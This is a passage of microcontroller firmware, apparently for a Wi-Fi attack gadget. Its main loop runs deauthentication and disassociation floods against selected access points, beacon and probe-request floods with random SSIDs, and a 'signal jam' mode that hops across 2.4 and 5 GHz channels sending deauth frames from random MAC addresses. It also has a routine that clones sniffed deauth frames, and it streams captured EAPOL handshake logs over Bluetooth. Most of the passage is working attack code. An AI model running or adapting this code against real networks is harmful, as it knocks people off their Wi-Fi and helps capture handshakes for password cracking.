    serialCmdTail = (serialCmdTail + 1) % SERIAL_CMD_QUEUE_SIZE;
    handleCommand(String(sCmdBuf));
    pollSerialInput();
  }

  // Handle commands queued from the BLE task (critical section protected)
  while (true) {
    if (consumePriorityStopIfPending()) break;
    char cmdBuf[BLE_BUF_SIZE];
    bool hasCmd = false;
    rtw_enter_critical(NULL, NULL);
    if (cmdTail != cmdHead) {
      strncpy(cmdBuf, cmdRing[cmdTail], sizeof(cmdBuf) - 1);
      cmdBuf[sizeof(cmdBuf) - 1] = '\0';
      cmdTail = (cmdTail + 1) % CMD_RING_SIZE;
      hasCmd = true;
    }
    rtw_exit_critical(NULL, NULL);
    if (!hasCmd) break;
    handleCommand(String(cmdBuf));
  }

  // 兜底：若双队列排空后 emergencyStopRequested 仍置位且队列中无待消费的停机指令，立即执行一次安全停机复位活跃状态
  if (emergencyStopRequested) {
    bool stopQueued = false;
    uint8_t sIdx = serialCmdTail;
    while (sIdx != serialCmdHead) {
      if (isStopCmdCstr(serialCmdQueue[sIdx])) {
        stopQueued = true;
        break;
      }
      sIdx = (sIdx + 1) % SERIAL_CMD_QUEUE_SIZE;
    }
    if (!stopQueued && hasQueuedStopInCmdRing()) {
      stopQueued = true;
    }
    if (!stopQueued) {
      handleCommand("stop");
    }
  }

  // Pump non-blocking BLE scan/sync stream under 2A TX credit flow control
  pumpBleScanPush();

  // Handle web clients (throttled to 25ms to reduce lwIP non-blocking accept overhead)
  static unsigned long lastWebPoll = 0;
  if (millis() - lastWebPoll >= 25) {
    lastWebPoll = millis();
    handleWebClient();
  }

  // Deferred SoftAP restart after SSID/Password change (allows BLE notify / HTTP 200 to flush first)
  if (pendingApRestart && (millis() - pendingApRestartAt >= 300)) {
    pendingApRestart = false;
    bool sniffActive = false;
    rtw_enter_critical(NULL, NULL);
    sniffActive = (isSniffing || deauth_sniff_enabled);
    rtw_exit_critical(NULL, NULL);
    if (apEnabled && !sniffActive) {
      stopAllActiveAttacks();
      if (startSoftAP()) {
        Serial.print("[INFO] SoftAP restarted with new credentials: ");
        Serial.println(ap_ssid);
      } else {
        Serial.println("[ERROR] SoftAP restart with new credentials failed!");
      }
      blePushStatus();
    }
  }

  // Timed Attack check
  checkTimedAttack();

  // Attack cycles (3-OptA: non-blocking sliced TX across loop() ticks)
  if (deauthSlice.active) {
    if (!attack_enabled || emergencyStopRequested) {
      deauthSlice.reset();
      restoreDefaultChannelIfNeeded(false);
      if (USE_LED) digitalWrite(LED_B, LOW);
    } else if (!stepSlicedTxCycle(deauthSlice, true, true, 8)) {
      last_cycle = millis();
      checkTimedAttack();
    }
  } else if (millis() - last_cycle > cycle_delay) {
    if (attack_enabled && !emergencyStopRequested) {
      if (scan_between_cycles) {
        Serial.println("[INFO] Starting scan between attack cycles...");
        if (scanNetworks(true, true) == 0) {
          printScanResults();
        }
      }
      if (!shouldAbortCycle() && attack_enabled) {
        std::vector<WiFiScanResult> targets;
        bool isTargetMode = false;
        if (lockScanMutex()) {
          isTargetMode = target_mode;
          if (isTargetMode) {
            targets = target_aps;
          }
          unlockScanMutex();
        }
        if (isTargetMode && !targets.empty()) {
          deauthSlice.reset();
          deauthSlice.targets = targets;
          deauthSlice.active = true;
          if (USE_LED) digitalWrite(LED_B, HIGH);
          if (!stepSlicedTxCycle(deauthSlice, true, true, 8)) {
            last_cycle = millis();
            checkTimedAttack();
          }
        } else {
          // 决策 A：无已选目标时停止攻击而非回退全量攻击
          attack_enabled = false;
          timedAttackEnabled = false;
          blePushStatus();
          Serial.println("[WARN] Deauth attack stopped: no selected targets.");
          last_cycle = millis();
        }
      } else {
        checkTimedAttack();
        last_cycle = millis();
      }
    } else {
      last_cycle = millis();
    }
  }

  //===============================
  // CONTINUOUS DISASSOC ATTACK (3-OptA: non-blocking sliced TX)
  //===============================
  if (disassocSlice.active) {
    if (!disassoc_enabled || emergencyStopRequested) {
      disassocSlice.reset();
      restoreDefaultChannelIfNeeded(false);
      if (USE_LED) digitalWrite(LED_B, LOW);
    } else if (!stepSlicedTxCycle(disassocSlice, false, true, 8)) {
      Serial.println("[DISASSOC] Attack cycle completed.");
    }
  } else if (disassoc_enabled && !emergencyStopRequested && (millis() - last_disassoc_attack >= disassoc_interval)) {
    last_disassoc_attack = millis();

    std::vector<WiFiScanResult> aps_to_attack = snapshotDisassocTargets();

    if (aps_to_attack.empty()) {
      // 决策 A：无选定目标时停止 Disassoc，绝不回退全攻
      disassoc_enabled = false;
      restoreDefaultChannelIfNeeded(false);
      if (USE_LED) digitalWrite(LED_B, LOW);
      blePushStatus();
      Serial.println("[WARN] Disassoc stopped: no selected targets.");
    } else {
      disassocSlice.reset();
      disassocSlice.targets = aps_to_attack;
      disassocSlice.active = true;
      if (USE_LED) digitalWrite(LED_B, HIGH);
      if (!stepSlicedTxCycle(disassocSlice, false, true, 8)) {
        Serial.println("[DISASSOC] Attack cycle completed.");
      }
    }
  }

  //===============================
  // BEACON FLOOD
  //===============================
  if (beacon_flood_enabled && !emergencyStopRequested && (millis() - last_beacon_flood >= beacon_flood_delay)) {
    last_beacon_flood = millis();
    char fakeSSID[BEACON_MAX_SSID_LEN + 1];
    int ssidLen = random(8, 17);
    for (int i = 0; i < ssidLen; i++) {
      fakeSSID[i] = random(33, 127);
    }
    fakeSSID[ssidLen] = 0;
    wifi_tx_beacon_frame(fakeSSID, ssidLen, (uint8_t)getCurrentChannelSafe());
    beacon_flood_count++;
    if (beacon_flood_count % 20 == 0) {
      Serial.print("[BCN FLOOD] ");
      Serial.print(beacon_flood_count);
      Serial.println(" beacons sent");
    }
  }

  //===============================
  // PROBE FLOOD
  //===============================
  if (probe_flood_enabled && !emergencyStopRequested && (millis() - last_probe_flood >= probe_flood_delay)) {
    last_probe_flood = millis();
    char fakeSSID[BEACON_MAX_SSID_LEN + 1];
    int ssidLen = random(4, 13);
    for (int i = 0; i < ssidLen; i++) {
      fakeSSID[i] = random(33, 127);
    }
    fakeSSID[ssidLen] = 0;
    wifi_tx_probe_req_frame(fakeSSID, ssidLen);
    probe_flood_count++;
    if (probe_flood_count % 50 == 0) {
      Serial.print("[PRB FLOOD] ");
      Serial.print(probe_flood_count);
      Serial.println(" probes sent");
    }
  }

  //===============================
  // SIGNAL JAM (rapid channel cycling + deauth)
  //===============================
  if (signal_jam_enabled && !emergencyStopRequested && (millis() - last_signal_jam >= signal_jam_hop_delay)) {
    last_signal_jam = millis();
    feedWatchdog();
    // 合并轮询 2.4G + 5G 全信道，仅在切频成功时更新 currentChannel，并在 SoftAP 开启时及时回切 CH 1
    static const int num2G = sizeof(CHANNELS_2GHZ) / sizeof(CHANNELS_2GHZ[0]);
    static const int num5G = sizeof(CHANNELS_5GHZ) / sizeof(CHANNELS_5GHZ[0]);
    int totalChs = num2G + num5G;
    if (signal_jam_ch_index < 0 || signal_jam_ch_index >= totalChs) {
      signal_jam_ch_index = 0;
    }
    int targetCh = (signal_jam_ch_index < num2G)
      ? CHANNELS_2GHZ[signal_jam_ch_index]
      : CHANNELS_5GHZ[signal_jam_ch_index - num2G];
    signal_jam_ch_index = (signal_jam_ch_index + 1) % totalChs;

    if (wifi_set_channel(targetCh) == RTW_SUCCESS) {
      setCurrentChannelSafe(targetCh);
      for (int j = 0; j < 3; j++) {
        if (shouldAbortCycle()) break;
        uint8_t fakeBSSID[6];
        randomMAC(fakeBSSID);
        wifi_tx_deauth_frame(fakeBSSID, dst_mac, deauth_reasons[j % num_deauth_reasons]);
      }
      signal_jam_count++;
      if ((apEnabled || softApActive) && targetCh != WIFI_CHANNEL) {
        if (wifi_set_channel(WIFI_CHANNEL) == RTW_SUCCESS) {
          setCurrentChannelSafe(WIFI_CHANNEL);
        }
      }
    } else {
      Serial.print("[WARN] signal_jam wifi_set_channel(");
      Serial.print(targetCh);
      Serial.println(") failed");
    }
    if (USE_LED) { digitalWrite(LED_B, !digitalRead(LED_B)); }
    if (signal_jam_count > 0 && signal_jam_count % 50 == 0) {
      Serial.print("[SIG JAM] ");
      Serial.print(signal_jam_count);
      Serial.print(" cycles, ch=");
      Serial.println(targetCh);
    }
  }

  //===============================
  // DEAUTH SNIFF-AND-CLONE
  //===============================
  bool runDeauthCloneTx = false;
  uint8_t clonedSrc[6];
  int targetCh = WIFI_CHANNEL;
  int prevCh = WIFI_CHANNEL;
  if (millis() - last_deauth_sniff_attack >= deauth_sniff_interval) {
    rtw_enter_critical(NULL, NULL);
    if (deauth_sniff_enabled && !emergencyStopRequested && has_sniffed_deauth) {
      memcpy(clonedSrc, sniffed_deauth_src, 6);
      targetCh = sniffed_deauth_ch;
      prevCh = currentChannel;
      has_sniffed_deauth = false;
      runDeauthCloneTx = true;
    }
    rtw_exit_critical(NULL, NULL);
  }
  if (runDeauthCloneTx) {
    last_deauth_sniff_attack = millis();

    // Pause promisc callback briefly to TX cloned frame cleanly, without toggling UI isSniffing state
    wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
    if (promiscCallbackInFlight > 0) {
      waitForPromiscCallbacksIdle();
    }
    bool switched = false;
    bool chReady = (targetCh == prevCh);
    if (!chReady && wifi_set_channel(targetCh) == RTW_SUCCESS) {
      setCurrentChannelSafe(targetCh);
      switched = true;
      chReady = true;
    }
    if (chReady) {
      for (unsigned long j = 0; j < num_send_frames; j++) {
        if (shouldAbortCycle()) break;
        wifi_tx_deauth_frame(clonedSrc, dst_mac, deauth_reasons[j % num_deauth_reasons]);
        delay(1);
      }
    }
    if (switched && wifi_set_channel(prevCh) == RTW_SUCCESS) {
      setCurrentChannelSafe(prevCh);
    }
    bool keepPromisc = false;
    rtw_enter_critical(NULL, NULL);
    keepPromisc = (deauth_sniff_enabled && isSniffing && !emergencyStopRequested);
    rtw_exit_critical(NULL, NULL);
    if (keepPromisc) {
      wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_callback, 1);
    }
  }

  // Handle channel hopping if enabled
  bool sniffingLoop = false;
  rtw_enter_critical(NULL, NULL);
  sniffingLoop = (isSniffing && !emergencyStopRequested);
  rtw_exit_critical(NULL, NULL);
  if (sniffingLoop) {
    hopChannel();
  }

  // Drain sniff logs safely in main loop:
  // - UART capped at <=25 lines/s (>=40ms interval) to prevent 115200 TX FIFO stalls under bursts.
  // - BLE sniff stream uses priority bypass (EAPOL/Deauth/Disassoc/Pwnagotchi) + adaptive backpressure
  //   (100ms..800ms, MTU-aware, credit headroom >=3) so Packet Stream stays populated without starving
  //   the 1s status heartbeat or LL supervision (disc_cause=0x0108).
  static unsigned long lastLogPush = 0;
  static unsigned long lastDropWarnMs = 0;
  unsigned long nowLoopMs = millis();
  if (nowLoopMs - lastLogPush >= 40) {
    char logItem[LOG_STR_LEN];
    bool hasLog = false;
    uint32_t dropped = 0;
    rtw_enter_critical(NULL, NULL);
    if (logTail != logHead) {
      size_t cp = strlen(sniffLogRing[logTail]) + 1;
      if (cp > sizeof(logItem)) cp = sizeof(logItem);
      memcpy(logItem, sniffLogRing[logTail], cp);
      logItem[sizeof(logItem) - 1] = '\0';
      logTail = (logTail + 1) % LOG_RING_SIZE;
      hasLog = true;
    }
    if (droppedLogCount > 0 && (nowLoopMs - lastDropWarnMs >= 2000)) {
      dropped = droppedLogCount;
      droppedLogCount = 0;
      lastDropWarnMs = nowLoopMs;
    }
    rtw_exit_critical(NULL, NULL);
    if (hasLog) {
      lastLogPush = nowLoopMs;
      Serial.println(logItem);

      uint8_t logConnId = 0;
      if (!bleScanPush.active && isBleReadyToNotifySafe(logConnId)) {
        bool isPriority = (strncmp(logItem, "[DATA] EAPOL", 12) == 0 ||
                           strncmp(logItem, "[MGMT] Deauth", 13) == 0 ||
                           strncmp(logItem, "[MGMT] Disassoc", 15) == 0 ||
                           strstr(logItem, "Pwnagotchi") != nullptr);
        if (isPriority) {
          if (lastBlePriorityLogMs == 0 || (nowLoopMs - lastBlePriorityLogMs >= 15)) {
            lastBlePriorityLogMs = nowLoopMs;
            if (!bleSendSniffLog((const char *)logItem, true)) {
              rtw_enter_critical(NULL, NULL);
              bleDroppedLogCount++;
              rtw_exit_critical(NULL, NULL);
            }
          }
        } else {
          uint16_t mtuSnap = getEffectiveBleAttMtu(logConnId);
          unsigned long baseIntervalMs = (mtuSnap < 80) ? BLE_SNIFF_LOW_MTU_INTERVAL_MS : BLE_SNIFF_BASE_INTERVAL_MS;
          unsigned long curBackoffMs = (bleLogBackoffMs < baseIntervalMs) ? baseIntervalMs : bleLogBackoffMs;
          if (lastBleRoutineLogMs == 0 || (nowLoopMs - lastBleRoutineLogMs >= curBackoffMs)) {
            lastBleRoutineLogMs = nowLoopMs;
            if (bleSendSniffLog((const char *)logItem, false)) {
              if (curBackoffMs > baseIntervalMs) {
                unsigned long excess = curBackoffMs - baseIntervalMs;
                bleLogBackoffMs = baseIntervalMs + ((excess > 50UL) ? (excess - 50UL) : 0UL);
              } else {
                bleLogBackoffMs = baseIntervalMs;
              }
            } else {
              unsigned long doubled = curBackoffMs * 2UL;
              bleLogBackoffMs = (doubled <= BLE_SNIFF_MAX_BACKOFF_MS) ? doubled : BLE_SNIFF_MAX_BACKOFF_MS;
              rtw_enter_critical(NULL, NULL);
              bleDroppedLogCount++;
              rtw_exit_critical(NULL, NULL);
            }
          }
        }
      }
    }
    if (dropped > 0) {
      char warnBuf[80];
      snprintf(warnBuf, sizeof(warnBuf), "[WARN] Sniff log ring dropped %lu overflow frames", (unsigned long)dropped);
      Serial.println(warnBuf);
    }
  }

  // Push status heartbeat every 1s (non-critical per 2A congestion control)
  static unsigned long lastStatusPush = 0;
  if (millis() - lastStatusPush >= 1000) {
    lastStatusPush = millis();
    blePushStatus(false);
  }

  // Periodic FreeHeap diagnostics every 30s (4A)
  static unsigned long lastHeapDiagMs = 0;
  unsigned long nowDiagMs = millis();
  if (nowDiagMs - lastHeapDiagMs >= 30000) {
    lastHeapDiagMs = nowDiagMs;
    size_t freeHeap = xPortGetFreeHeapSize();
    size_t minHeap = xPortGetMinimumEverFreeHeapSize();
    char diagBuf[96];
    snprintf(diagBuf, sizeof(diagBuf), "[DIAG] FreeHeap=%luB MinEver=%luB Uptime=%lus",
             (unsigned long)freeHeap,
             (unsigned long)minHeap,
             (unsigned long)(nowDiagMs / 1000UL));
    Serial.println(diagBuf);
    if (freeHeap < 24576) {
      Serial.println("[WARN] Low FreeHeap (<24KB)!");
    }
  }
}
